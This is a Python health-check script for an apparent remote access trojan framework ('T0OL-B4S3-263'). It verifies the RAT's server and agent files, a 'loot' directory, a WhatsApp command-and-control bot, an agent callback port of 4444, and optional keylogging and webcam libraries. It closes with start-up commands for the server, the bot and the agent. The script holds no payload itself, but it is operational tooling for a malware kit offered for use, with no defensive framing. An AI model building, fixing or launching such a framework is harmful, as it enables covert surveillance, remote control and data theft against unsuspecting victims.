#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    T0OL-B4S3-263 - System Diagnostic Tool
    Check framework health, dependencies, and configuration
═══════════════════════════════════════════════════════════════════════════════
"""

import subprocess
import sys
from pathlib import Path
import json

class Diagnostic:
    def __init__(self):
        self.workspace = Path(__file__).parent
        self.issues = []
        self.warnings = []
        self.success = []
    
    def print_header(self, text):
        print(f"\n{'═' * 70}")
        print(f"  {text}")
        print(f"{'═' * 70}\n")
    
    def check_python(self):
        """Check Python version"""
        self.print_header("Python Environment")
        
        version = sys.version
        major, minor, patch = sys.version_info[:3]
        
        print(f"  Version: {major}.{minor}.{patch}")
        print(f"  Executable: {sys.executable}")
        
        if major >= 3 and minor >= 7:
            self.success.append("Python version compatible")
        else:
            self.issues.append(f"Python {major}.{minor} - requires 3.7+")
    
    def check_dependencies(self):
        """Check all dependencies"""
        self.print_header("Dependency Check")
        
        dependencies = {
            'yaml': 'pyyaml',
            'flask': 'flask',
            'cryptography': 'cryptography',
            'sqlite3': 'sqlite3',
            'json': 'json',
            'requests': 'requests',
            'psutil': 'psutil (optional)',
            'cv2': 'opencv-python (optional)',
            'pynput': 'pynput (optional)',
        }
        
        for import_name, package_name in dependencies.items():
            try:
                __import__(import_name)
                print(f"  ✓ {import_name:.<25} {package_name}")
                self.success.append(f"Package: {package_name}")
            except ImportError:
                is_optional = '(optional)' in package_name
                status = "⊘ (optional)" if is_optional else "✗"
                print(f"  {status} {import_name:.<25} {package_name}")
                if not is_optional:
                    self.issues.append(f"Missing: {package_name}")
                else:
                    self.warnings.append(f"Optional: {package_name}")
    
    def check_files(self):
        """Check required files"""
        self.print_header("Required Files")
        
        required_files = [
            'master_umbrella_setup.py',
            'rat_server_fixed.py',
            'rat_ultimate.py',
            'agent_registry.py',
            'communication_managers.py',
            'command_executor.py',
            'api_bridge.py',
            'rest_api_server.py',
            'startup.py',
            'umbrella_config.yaml',
            'requirements.txt',
        ]
        
        for filename in required_files:
            filepath = self.workspace / filename
            if filepath.exists():
                size = filepath.stat().st_size
                print(f"  ✓ {filename:.<40} ({size:,} bytes)")
                self.success.append(f"File: {filename}")
            else:
                print(f"  ✗ {filename:.<40} MISSING")
                self.issues.append(f"Missing file: {filename}")
    
    def check_directories(self):
        """Check required directories"""
        self.print_header("Required Directories")
        
        required_dirs = [
            'data',
            'loot',
            'whatsapp-c2',
        ]
        
        for dirname in required_dirs:
            dirpath = self.workspace / dirname
            if dirpath.exists():
                print(f"  ✓ {dirname}/")
                self.success.append(f"Directory: {dirname}")
            else:
                print(f"  ✗ {dirname}/ MISSING")
                self.issues.append(f"Missing directory: {dirname}")
        
        # Create data directory if missing
        data_dir = self.workspace / 'data'
        if not data_dir.exists():
            data_dir.mkdir(exist_ok=True)
            print(f"\n  ℹ Created: data/")
    
    def check_node(self):
        """Check Node.js availability"""
        self.print_header("Node.js & WhatsApp Bot")
        
        try:
            result = subprocess.run(
                ['node', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            version = result.stdout.strip()
            print(f"  ✓ Node.js {version}")
            self.success.append("Node.js installed")
            
            # Check npm
            result = subprocess.run(
                ['npm', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            npm_version = result.stdout.strip()
            print(f"  ✓ npm {npm_version}")
            
            # Check bot dependencies
            bot_dir = self.workspace / 'whatsapp-c2'
            node_modules = bot_dir / 'node_modules'
            if node_modules.exists():
                print(f"  ✓ WhatsApp bot modules installed")
                self.success.append("Bot dependencies installed")
            else:
                print(f"  ⊘ WhatsApp bot modules (run: cd whatsapp-c2 && npm install)")
                self.warnings.append("Bot modules not installed")
        
        except FileNotFoundError:
            print(f"  ⊘ Node.js not found")
            print(f"     Download from: https://nodejs.org/")
            self.warnings.append("Node.js not installed")
    
    def check_configuration(self):
        """Check configuration files"""
        self.print_header("Configuration Files")
        
        config_file = self.workspace / 'umbrella_config.yaml'
        
        if config_file.exists():
            try:
                import yaml
                with open(config_file, 'r') as f:
                    config = yaml.safe_load(f)
                
                print(f"  ✓ umbrella_config.yaml")
                
                # Check key values
                if config.get('server', {}).get('listen_port') == 4444:
                    print(f"    - Server port: 4444 ✓")
                    self.success.append("Config: server port configured")
                
                if config.get('agent', {}).get('callback_port') == 4444:
                    print(f"    - Agent callback: 4444 ✓")
                    self.success.append("Config: agent callback configured")
                
                encryption_key = config.get('agent', {}).get('encryption_key')
                if encryption_key and encryption_key != 'generated_at_setup':
                    print(f"    - Encryption: configured ✓")
                    self.success.append("Config: encryption key set")
                else:
                    print(f"    - Encryption: default (should be changed for production)")
                    self.warnings.append("Config: change encryption key for production")
                
            except Exception as e:
                self.issues.append(f"Config parsing error: {e}")
        else:
            print(f"  ✗ umbrella_config.yaml MISSING")
            self.issues.append("Missing configuration file")
    
    def check_imports(self):
        """Test critical imports"""
        self.print_header("Core Module Imports")
        
        modules = [
            'master_umbrella_setup',
            'agent_registry',
            'communication_managers',
            'command_executor',
            'api_bridge',
            'rest_api_server',
        ]
        
        for module_name in modules:
            try:
                __import__(module_name)
                print(f"  ✓ {module_name}")
                self.success.append(f"Module: {module_name}")
            except Exception as e:
                print(f"  ✗ {module_name}: {str(e)[:40]}")
                self.issues.append(f"Module import failed: {module_name}")
    
    def print_summary(self):
        """Print diagnostic summary"""
        self.print_header("Diagnostic Summary")
        
        print(f"  ✓ Success: {len(self.success)}")
        print(f"  ⚠️  Warnings: {len(self.warnings)}")
        print(f"  ✗ Issues: {len(self.issues)}")
        
        if self.issues:
            print(f"\n  Issues to fix:")
            for issue in self.issues:
                print(f"    • {issue}")
        
        if self.warnings:
            print(f"\n  Recommendations:")
            for warning in self.warnings:
                print(f"    • {warning}")
        
        if not self.issues:
            print(f"\n  ✅ Framework is ready to use!")
            print(f"\n  Quick start:")
            print(f"    python startup.py server  # Terminal 1")
            print(f"    python startup.py bot     # Terminal 2")
            print(f"    python startup.py agent   # Terminal 3")
            return True
        else:
            print(f"\n  ❌ Please fix issues above before using framework")
            return False
    
    def run(self):
        """Run all diagnostics"""
        print("\n" + "╔" + "═" * 68 + "╗")
        print("║" + " " * 18 + "T0OL-B4S3-263 System Diagnostic" + " " * 18 + "║")
        print("╚" + "═" * 68 + "╝")
        
        self.check_python()
        self.check_dependencies()
        self.check_files()
        self.check_directories()
        self.check_node()
        self.check_configuration()
        self.check_imports()
        
        return self.print_summary()

if __name__ == '__main__':
    diagnostic = Diagnostic()
    success = diagnostic.run()
    print("\n")
    sys.exit(0 if success else 1)
